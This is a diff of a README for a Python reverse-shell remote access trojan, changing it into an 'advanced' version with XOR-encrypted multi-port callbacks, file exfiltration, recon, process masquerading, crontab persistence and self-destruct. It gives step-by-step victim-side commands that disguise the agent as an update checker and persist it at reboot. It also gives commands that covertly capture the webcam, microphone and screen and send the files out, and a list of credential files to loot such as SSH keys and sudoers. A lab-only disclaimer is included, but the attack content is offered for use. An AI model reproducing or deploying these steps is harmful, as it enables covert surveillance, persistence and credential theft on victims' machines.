@@ -1,111 +1,118 @@
-# 🐍 Reverse Shell RAT with XOR Encryption
 
-## 📘 Learning Path
+# 🐍 Advanced Reverse Shell RAT (Multi-port, XOR, Recon, Persistence)
 
-This project started as a basic Python shell and evolved into a stealthy, encrypted reverse shell:
+## 📘 Learning Path Progression
 
-1. 🛠️ **Basic Shell**: Socket + subprocess commands
-2. 🔁 **Hybrid (Bind + Reverse)**
-3. 🔄 **Reverse-Only Shell** (more stealthy)
-4. 🔐 **XOR Encryption**
-5. 🧾 **Session Logging**
-6. 👻 **Background Execution + Persistence**
-7. 🔭 **Cool Shell Command Extensions**
-
----
-
-## 🎯 Overview
-
-This tool enables remote shell access from a victim Ubuntu machine to a Kali controller using encrypted reverse sockets.
+1. 🛠️ Socket Shell Basics
+2. 🔁 Bind & Reverse Hybrid Shells
+3. 🔐 XOR Encrypted Communication
+4. 📥 File Download (`get`)
+5. 📜 Multiline Response Handling
+6. 🎯 Recon Command (System Looting)
+7. 🔁 Crontab Persistence
+8. 👻 Process Renaming
+9. 🔥 Multi-Port Reverse Shell
+10. 💣 Self-Destruct Feature
 
 ---
 
-## ⚙️ Features
+## 🚀 Features
 
-- Reverse TCP shell
-- XOR-encrypted traffic
-- Command execution with shell output
-- Screenshot support
-- Timestamped logging
-- Runs silently in background
-- No external Python packages
+- Reverse shell using XOR encryption over multiple ports (443, 53, 8080)
+- Executes shell commands with multi-line response support
+- Supports `get <file>` for file exfiltration
+- `recon`: automated data collection on victim
+- `selfdestruct`: safely removes agent
+- Optional: Process title masking (e.g., `dbus-daemon`)
+- Persistence using `crontab`
 
 ---
 
-## 🚀 How to Use
+## 🔄 Usage Instructions
 
-### Kali (Attacker)
-
+### On Kali (Controller)
 ```bash
-python3 listener.py
+python3 listener_xor.py
 ```
 
-### Ubuntu (Victim)
+> Listens on ports 443, 53, and 8080 for incoming reverse shells.
 
-Edit agent file:
+### On Ubuntu (Victim)
 
+Edit `agent_reverse.py` and update:
 ```python
-REVERSE_HOST = "192.168.56.103"  # ← change to Kali IP
+CONTROLLER_IP = "192.168.56.10"  # your Kali IP
 ```
 
-Then run it in the background:
-
+Run in background:
 ```bash
 pkill -f agent.py
-nohup python3 agent_reverse.py &>/dev/null &
+nohup python3 ~/.config/update-check.py &>/dev/null &
+```
+
+Enable persistence:
+```bash
+(crontab -l 2>/dev/null; echo "@reboot nohup python3 ~/.config/update-check.py &") | crontab -
 ```
 
 ---
 
-## 🎮 Cool Shell Commands to Run
+## 🎮 Cool Commands to Run
 
-### 📷 Webcam Snapshot
-
+### 📷 Screenshot
 ```bash
-fswebcam -r 640x480 --jpeg 85 -D 1 /tmp/webcam.jpg && cat /tmp/webcam.jpg
+scrot /tmp/screen.png && sleep 1 && get /tmp/screen.png
 ```
 
-**Install:**
+### 📸 Webcam
 ```bash
-sudo apt install fswebcam
+fswebcam /tmp/webcam.jpg && sleep 1 && get /tmp/webcam.jpg
 ```
+
+### 🎤 Microphone
+```bash
+arecord -f cd -d 10 /tmp/audio.wav && get /tmp/audio.wav
+```
+
+### 🧠 Recon Command
+```bash
+recon
+```
+
+### 💣 Self-Destruct
+```bash
+selfdestruct
+```
+
+Deletes the agent script from disk.
 
 ---
 
-### 🎤 Microphone Audio (10 sec)
+## 📂 Valuable Files to Loot
 
-```bash
-arecord -f cd -d 10 /tmp/audio.wav && cat /tmp/audio.wav
-```
-
-**Install:**
-```bash
-sudo apt install alsa-utils
-```
+- `/etc/passwd`, `/etc/group`, `/etc/sudoers`
+- `~/.ssh/id_rsa`, `~/.bash_history`
+- `/etc/NetworkManager/system-connections/*`
+- `.env`, `config.json`, `.git`, browser profiles
 
 ---
 
-### 🧠 Recon Combo
+## 🛡️ Security Score
 
-```bash
-whoami && hostname && uname -a && ip a && ps aux
-```
-
-Get full snapshot of identity, system info, IP, and processes.
-
----
-
-### 📁 List Bash History
-
-```bash
-find /home -name .bash_history -exec cat {} \;
-```
+| Category        | Score | Notes |
+|-----------------|-------|-------|
+| Stealth         | 7/10  | XOR, multi-port, process rename |
+| Resilience      | 8/10  | Crontab + port fallback |
+| Detection Risk  | 5/10  | Reverse shell visible to firewalls |
+| Educational Use | 🔟     | Ideal for real-world red team skills |
 
 ---
 
-## ⚠️ Ethical Use Only
+## ⚠️ Legal Disclaimer
 
-This tool is for lab use only. Do not use it on any system without explicit permission.
+This tool is for educational and authorized use only.
+**Do not deploy** on systems you do not own or have written permission to test.
 
 ---
 
+Built to learn. Built to bypass. Built to improve. 🧙🏽‍♂️
